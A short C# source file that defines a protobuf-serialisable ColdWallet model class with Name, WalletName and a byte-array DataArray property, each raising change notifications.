using ProtoBuf;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Common
{
	[ProtoContract(Name = "ColdWallet")]
	public class ColdWallet : INotifyPropertyChanged
	{
		private string _name;

		private string _walletName;

		private byte[] _dataArray;

		[ProtoMember(1, Name = "Name")]
		public string Name
		{
			get
			{
				return _name;
			}
			set
			{
				_name = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Name"));
			}
		}

		[ProtoMember(2, Name = "DataArray")]
		public byte[] DataArray
		{
			get
			{
				return _dataArray;
			}
			set
			{
				_dataArray = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("DataArray"));
			}
		}

		[ProtoMember(3, Name = "WalletName")]
		public string WalletName
		{
			get
			{
				return _walletName;
			}
			set
			{
				_walletName = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("WalletName"));
			}
		}

		public event PropertyChangedEventHandler PropertyChanged;
	}
}
